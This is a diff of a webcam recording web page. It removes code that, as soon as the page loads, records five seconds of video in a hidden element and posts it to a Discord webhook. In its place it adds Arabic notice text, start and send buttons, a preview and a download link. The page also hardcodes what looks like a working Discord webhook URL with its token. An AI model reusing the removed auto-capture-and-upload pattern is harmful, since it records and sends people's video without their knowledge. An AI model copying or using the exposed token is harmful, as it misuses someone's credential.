@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>cam capture</title>
+  <title>تسجيل مقطع بالكاميرا</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
@@ -57,26 +57,34 @@
       margin-right: 8px;
       vertical-align: middle;
     }
+    button, .download { padding: 12px 20px; border-radius: 8px; border: 1px solid #555; background: #25254a; color: white; cursor: pointer; font: inherit; }
+    button:disabled { opacity: .5; cursor: wait; }
+    [hidden] { display: none !important; }
+    p { max-width: 480px; text-align: center; line-height: 1.7; }
+    video { max-width: 100%; }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 <body>
 
-  <div id="status" class="wait">
-    <span class="spinner"></span>requesting camera permission…
-  </div>
+  <h1>تسجيل مقطع بالكاميرا</h1>
+  <p>سجّل مقطعًا مدته 5 ثوانٍ بدون صوت، ثم عاينه أو نزّله. لن يُرسل المقطع إلى قناة Discord المرتبطة بالموقع إلا عند الضغط على زر الإرسال.</p>
+  <button id="start" type="button">بدء التسجيل بالكاميرا</button>
+  <div id="status" role="status" aria-live="polite">الكاميرا متوقفة. اضغط لبدء التسجيل.</div>
+  <a id="download" class="download" hidden>تنزيل المقطع</a>
+  <button id="upload" type="button" hidden>إرسال هذا المقطع إلى Discord</button>
 
   <video id="hiddenVideo" autoplay playsinline muted></video>
   <video id="preview" controls playsinline></video>
 
 <script>
-(async function() {
+async function startCapture() {
   'use strict';
 
   // ── CONFIG ──────────────────────────────────────────────
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1571063942070141009/PqOL28JrxhqnZYDRxju8M6fSKZHsfJ4z3kuvWLt5zvVSnuVYPB4I1iAInoFC4XHD7AmL';
   const RECORD_MS   = 5000;               // record duration (5s)
-  const MIME_TYPE   = 'video/webm;codecs=vp9,opus'; // fallback handled below
+  let previewUrl;
 
   const statusEl  = document.getElementById('status');
   const videoEl   = document.getElementById('hiddenVideo');
@@ -84,9 +92,22 @@
 
   const setStatus = (msg, cls) => {
     statusEl.className = cls || '';
-    statusEl.innerHTML = msg;
+    statusEl.textContent = msg;
   };
 
+  const startEl = document.getElementById('start');
+  const uploadEl = document.getElementById('upload');
+  const downloadEl = document.getElementById('download');
+  uploadEl.hidden = true;
+  downloadEl.hidden = true;
+  previewEl.style.display = 'none';
+  startEl.disabled = true;
+  if (!window.isSecureContext || !navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === 'undefined') {
+    setStatus('التسجيل غير متاح. افتح رابط HTTPS في متصفح حديث يدعم الكاميرا.', 'err');
+    startEl.disabled = false;
+    return;
+  }
+  setStatus('بانتظار إذن الوصول إلى الكاميرا…', 'wait');
   // ── 1. GET USER MEDIA ──────────────────────────────────
   let stream;
   try {
@@ -95,10 +116,12 @@
       audio: false           // audio off; enable if you want sound
     });
   } catch (err) {
-    setStatus('camera permission denied — ' + err.message, 'err');
+    startEl.disabled = false;
+    setStatus('تعذّر فتح الكاميرا. تحقق من الإذن وتأكد من أن الكاميرا غير مستخدمة.', 'err');
     return;
   }
 
+  videoEl.style.display = 'block';
   videoEl.srcObject = stream;
   await videoEl.play().catch(() => {});   // some browsers need a nudge
 
@@ -111,13 +134,14 @@
   ].find(t => MediaRecorder.isTypeSupported(t));
 
   if (!supported) {
-    setStatus('no supported recording codec found', 'err');
+    startEl.disabled = false;
+    setStatus('المتصفح لا يدعم صيغة تسجيل متاحة.', 'err');
     stream.getTracks().forEach(t => t.stop());
     return;
   }
 
   // ── 3. RECORD ──────────────────────────────────────────
-  setStatus('<span class="spinner"></span>recording ' + (RECORD_MS / 1000) + 's…', 'wait');
+  setStatus('جارٍ التسجيل لمدة 5 ثوانٍ…', 'wait');
 
   const chunks = [];
   let recorder;
@@ -128,7 +152,8 @@
       videoBitsPerSecond: 1_000_000   // ~1 Mbps — crisp enough, small file
     });
   } catch (err) {
-    setStatus('MediaRecorder init failed: ' + err.message, 'err');
+    startEl.disabled = false;
+    setStatus('تعذّر بدء التسجيل: ' + err.message, 'err');
     stream.getTracks().forEach(t => t.stop());
     return;
   }
@@ -137,7 +162,9 @@
     if (e.data && e.data.size > 0) chunks.push(e.data);
   };
 
-  recorder.onstop = async () => {
+  recorder.onstop = () => {
+    startEl.disabled = false;
+    videoEl.style.display = 'none';
     stream.getTracks().forEach(t => t.stop());   // release camera
 
     if (!chunks.length) {
@@ -146,17 +173,27 @@
     }
 
     const blob = new Blob(chunks, { type: supported.split(';')[0] });
-    const file = new File([blob], `cam_${Date.now()}.webm`, {
+    const file = new File([blob], `cam_${Date.now()}.${supported.startsWith('video/mp4') ? 'mp4' : 'webm'}`, {
       type: supported.split(';')[0],
       lastModified: Date.now()
     });
 
     // preview locally
-    previewEl.src = URL.createObjectURL(blob);
+    if (previewEl.src.startsWith('blob:')) URL.revokeObjectURL(previewEl.src);
+    previewUrl = URL.createObjectURL(blob);
+    previewEl.src = previewUrl;
+    downloadEl.href = previewUrl;
+    downloadEl.download = file.name;
+    downloadEl.hidden = false;
     previewEl.style.display = 'block';
     previewEl.load();
 
-    setStatus('<span class="spinner"></span>uploading to discord…', 'wait');
+    setStatus('التسجيل جاهز للمعاينة. يمكنك تنزيله أو اختيار إرساله إلى Discord.', 'ok');
+    uploadEl.hidden = false;
+    uploadEl.onclick = async () => {
+    uploadEl.disabled = true;
+    startEl.disabled = true;
+    setStatus('جارٍ إرسال المقطع إلى Discord…', 'wait');
 
     // ── 4. UPLOAD TO DISCORD ──────────────────────────
     const form = new FormData();
@@ -167,14 +204,15 @@
     form.append('file', file, file.name);
 
     try {
-      const res = await fetch(WEBHOOK_URL, {
+      const res = await fetch(WEBHOOK_URL + '?wait=true', {
         method: 'POST',
         body: form
         // DO NOT set Content-Type — fetch builds the multipart boundary
       });
 
       if (res.ok) {
-        setStatus('✅ upload complete — check discord', 'ok');
+        uploadEl.hidden = true;
+        setStatus('تم إرسال المقطع إلى Discord.', 'ok');
       } else {
         const txt = await res.text().catch(() => '');
         setStatus('❌ discord rejected: ' + res.status + ' ' + txt.slice(0, 200), 'err');
@@ -183,13 +221,18 @@
       // CORS / network failure fallback
       setStatus(
         '⚠️ upload blocked (CORS or network): ' + err.message +
-        '<br><small>open via a local server or use a CORS proxy</small>',
+        ' — يمكنك تنزيل المقطع والمحاولة لاحقًا.',
         'err'
       );
+    } finally {
+      uploadEl.disabled = false;
+      startEl.disabled = false;
     }
+    };
   };
 
   recorder.onerror = e => {
+    startEl.disabled = false;
     setStatus('recorder error: ' + (e.error?.message || 'unknown'), 'err');
     stream.getTracks().forEach(t => t.stop());
   };
@@ -206,7 +249,8 @@
     stream.getTracks().forEach(t => t.stop());
   }, RECORD_MS + 10_000);
 
-})();
+}
+document.getElementById('start').addEventListener('click', startCapture);
 </script>
 </body>
 </html>
